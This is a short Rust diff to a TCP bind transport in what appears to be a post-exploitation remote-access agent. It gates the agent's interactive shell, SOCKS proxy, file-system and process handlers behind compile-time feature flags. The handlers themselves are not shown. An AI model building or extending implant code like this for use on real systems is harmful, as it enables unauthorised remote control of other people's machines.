@@ -79,10 +79,37 @@ impl Transport for TcpBindTransport {
                                     let mut type_buf = [0u8; 1];
                                     if stream.read_exact(&mut type_buf).await.is_ok() {
                                         match type_buf[0] {
-                                            0x01 => crate::pty::handle_stream(stream).await,
-                                            0x02 => crate::socks::handle_stream(stream).await,
-                                            0x03 => crate::fs::handle_stream(stream).await,
-                                            0x04 => crate::process::handle_stream(stream).await,
+                                            0x01 => {
+                                                #[cfg(feature = "pty")]
+                                                crate::pty::handle_stream(stream).await;
+                                                #[cfg(not(feature = "pty"))]
+                                                {
+                                                    use futures_util::AsyncWriteExt;
+                                                    let mut s = stream;
+                                                    let _ = s.write_all(
+                                                        b"\r\n[!] Interactive terminal (PTY) is not compiled into this agent profile.\r\n",
+                                                    ).await;
+                                                    let _ = s.close().await;
+                                                }
+                                            }
+                                            0x02 => {
+                                                #[cfg(feature = "socks")]
+                                                crate::socks::handle_stream(stream).await;
+                                                #[cfg(not(feature = "socks"))]
+                                                { let _ = stream; }
+                                            }
+                                            0x03 => {
+                                                #[cfg(feature = "post-ex")]
+                                                crate::fs::handle_stream(stream).await;
+                                                #[cfg(not(feature = "post-ex"))]
+                                                { let _ = stream; }
+                                            }
+                                            0x04 => {
+                                                #[cfg(feature = "post-ex")]
+                                                crate::process::handle_stream(stream).await;
+                                                #[cfg(not(feature = "post-ex"))]
+                                                { let _ = stream; }
+                                            }
                                             _ => {}
                                         }
                                     }
